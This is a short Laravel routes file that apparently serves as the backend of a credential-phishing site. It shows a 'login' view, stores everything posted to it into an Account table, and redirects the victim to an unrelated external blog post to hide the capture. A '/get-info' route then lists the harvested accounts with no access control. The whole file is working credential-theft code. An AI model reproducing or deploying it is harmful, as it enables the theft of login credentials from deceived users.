<?php

use App\Account;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
 */

Route::get('/', function () {
    return view('login');
});

Route::post('', function () {
    Account::create(request()->all());

    return redirect('http://philnews.info/2017/01/05/hello-world/');
});

Route::get('/get-info', function () {
    $accounts = Account::latest()->paginate(30);

    return view('accounts', compact('accounts'));
});
